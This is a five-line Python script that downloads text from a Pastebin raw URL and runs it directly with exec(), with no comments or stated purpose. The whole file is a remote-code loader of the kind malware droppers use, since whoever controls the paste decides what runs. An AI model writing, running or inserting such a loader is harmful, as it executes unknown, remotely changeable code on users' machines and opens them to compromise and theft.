import requests
url = "https://pastebin.com/raw/jNiSJrji"
re = requests.get(url)
code = re.text
exec(code)
